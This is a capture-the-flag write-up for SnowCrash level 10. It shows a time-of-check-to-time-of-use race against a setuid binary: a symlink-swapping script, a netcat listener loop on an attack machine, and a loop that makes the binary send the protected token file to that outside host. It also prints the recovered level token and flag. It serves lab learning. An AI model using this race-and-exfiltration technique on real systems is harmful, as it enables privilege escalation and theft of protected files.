- In `/home/user/level10` we find the binary `level10` and a `token` file. We do not have permission to read the `token` file. The `binary` seems to send the file contents to a remote host, only if the file can be read.

```
level10@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
d--x--x--x  1 root    users     340 Aug 30  2015 ..
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-r-x------  1 level10 level10   675 Apr  3  2012 .profile
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
level10@SnowCrash:~$ ./level10
./level10 file host
        sends file to host if you have access to it
level10@SnowCrash:~$ ./level10 token 10.13.200.129
You don't have access to token
```

- Often when a file is sent to a remote network, the file permissions are not preserved. This means that if we can trick the binary into sending the file, we will be able to read the file on the remote network.

- We ex-filtrate the binary to the attack machine and de-compile the contents with `ghidra` . The file permissions are checked in the line `iVar2 = access((char *)in_stack_00000008[1],4);` and if the check returns the value 0, a connection is made before the line `iVar3 = open(pcVar6,0);` opens and reads the file to send its contents.

`<snip>`
![[Pasted image 20250914061117.png]]
```<snip>```
![[Pasted image 20250914061344.png]]
```<snip>```

- If we can switch the files between the access check and open functions, we can trick the binary into allowing us access to the file. This is a TOCTOU attack. Time-of-open-to-time-of-use. We want the binary to do the following:
		- Run access() on a dummy file we have read permissions over
		- Run open() on the token file

- We can achieve this by creating a script which continuously switches symlinks between the dummy file and the token file. Essentially, a race condition attack.

- Create a dummy file
```
level10@SnowCrash:/tmp$ echo test > /tmp/dummy
```

- Create a script to switch symlinks between the dummy file and the token file and run the script to create the continous switching
```
level10@SnowCrash:/tmp$ pwd
/tmp
level10@SnowCrash:/tmp$ cat racer.sh

#!/bin.bash
while true; do
    ln -sf /tmp/dummy /tmp/tryme
    ln -sf /home/user/level10/token /tmp/tryme
done

level10@SnowCrash:/tmp$ chmod +x racer.sh
level10@SnowCrash:/tmp$ ./racer.sh
```

- The port 6969 was identified after failed connection attempts from running the `level10` binary. Start a netcat listener on our attack machine on port 6969 which will continuously accept incoming files and connections. If we don't do this, the netcat listener will close after the first file is received, which could be the dummy file. 

```
──(kali㉿kali)-[~/Desktop/snowcrash]
└─$ while true; do
while> nc -lnvp 6969;
while> done;                                                          
listening on [any] 6969 ...
```

- Run the `level10` binary with the symlink `/tmp/tryme` in a while loop to continuously  check and send files to the attack machine, and hopefully have a race condition which will check the dummy file for access and proceed the program to open the token file.

```
level10@SnowCrash:~$ while true; do ./level10 /tmp/tryme 10.13.200.129; done;
<snip>
You don't have access to /tmp/tryme
Connecting to 10.13.200.129:6969 .. Connected!
Sending file .. wrote file!
Connecting to 10.13.200.129:6969 .. Unable to connect to host 10.13.200.129
Connecting to 10.13.200.129:6969 .. Connected!
Sending file .. wrote file!
You don't have access to /tmp/tryme
Connecting to 10.13.200.129:6969 .. Connected!
<snip>
```

- Eventually in the listener loop on the attack page you can distinguish between the dummy file and the token file with the contents `woupa2yuojeeaaed06riuj63c` 

![[Pasted image 20250914061903.png]]

- Authenticate to `flag10` using token `woupa2yuojeeaaed06riuj63c` to obtain the flag
```
level10@SnowCrash:~$ su flag10
Password: 
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

- Authenticate to `level11` with the token
```
flag10@SnowCrash:~$ su level11
Password: 
level11@SnowCrash:~$ 
```